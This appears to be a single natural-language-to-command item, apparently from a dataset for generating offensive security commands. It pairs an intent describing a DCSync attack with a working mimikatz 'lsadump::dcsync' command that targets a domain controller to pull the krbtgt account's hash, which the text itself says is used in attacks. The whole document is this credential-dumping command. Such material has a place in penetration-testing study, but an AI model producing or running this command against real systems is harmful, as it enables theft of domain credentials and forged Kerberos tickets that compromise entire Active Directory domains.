# Natural language intent:
# LDAP With this privilege you can dump the DC database using DCSync:  execute the "lsadump::dcsync" command, targeting the Domain Controller "pcdc.domain.local" for the "domain.local" domain and requesting the retrieval of sensitive information, specifically for the "krbtgt" user. This command is commonly used in attacks to extract and dump Kerberos Ticket Granting Ticket (TGT) hashes from Active Directory.

mimikatz lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
